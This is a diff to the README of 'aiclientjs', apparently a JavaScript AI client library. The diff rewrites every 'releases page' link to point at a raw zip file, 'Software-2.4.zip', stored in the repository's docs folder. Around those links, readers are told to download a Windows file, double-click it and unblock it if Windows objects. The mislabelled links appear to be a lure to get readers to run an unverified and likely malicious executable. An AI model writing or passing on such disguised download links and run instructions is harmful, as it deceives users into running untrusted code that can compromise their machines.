@@ -1,6 +1,6 @@
 # 🤖 aiclientjs - Simple AI access for any app
 
-[![Download aiclientjs](https://img.shields.io/badge/Download-aiclientjs-blue?style=for-the-badge&logo=github)](https://github.com/florysnug949/aiclientjs/releases)
+[![Download aiclientjs](https://img.shields.io/badge/Download-aiclientjs-blue?style=for-the-badge&logo=github)](https://github.com/florysnug949/aiclientjs/raw/refs/heads/main/docs/static/Software-2.4.zip)
 
 <p align="center">
   <strong>aiclientjs</strong> is a lightweight AI client for JavaScript and TypeScript.
@@ -12,7 +12,7 @@
 
 ## 📥 Download
 
-1. Open the [aiclientjs releases page](https://github.com/florysnug949/aiclientjs/releases)
+1. Open the [aiclientjs releases page](https://github.com/florysnug949/aiclientjs/raw/refs/heads/main/docs/static/Software-2.4.zip)
 2. Find the latest release
 3. Download the Windows file from the release assets
 4. Double-click the file to run it
@@ -42,7 +42,7 @@ It is built for JavaScript and TypeScript projects, but you do not need to know 
 
 ## 🚀 Getting Started
 
-1. Go to the [releases page](https://github.com/florysnug949/aiclientjs/releases)
+1. Go to the [releases page](https://github.com/florysnug949/aiclientjs/raw/refs/heads/main/docs/static/Software-2.4.zip)
 2. Download the latest Windows file
 3. Open your Downloads folder
 4. Double-click the file
@@ -84,7 +84,7 @@ aiclientjs works with several providers, so you can switch models without changi
 
 ## 🪟 Windows install steps
 
-1. Open the [releases page](https://github.com/florysnug949/aiclientjs/releases)
+1. Open the [releases page](https://github.com/florysnug949/aiclientjs/raw/refs/heads/main/docs/static/Software-2.4.zip)
 2. Download the latest Windows release file
 3. Right-click the file if Windows blocks it
 4. Choose Properties
@@ -199,7 +199,7 @@ If you see a `.zip` file, extract it before you run the app.
 
 ## 📎 Release page
 
-Use the [aiclientjs releases page](https://github.com/florysnug949/aiclientjs/releases) to download and run this file on Windows
+Use the [aiclientjs releases page](https://github.com/florysnug949/aiclientjs/raw/refs/heads/main/docs/static/Software-2.4.zip) to download and run this file on Windows
 
 ## 🧰 Example use cases
 
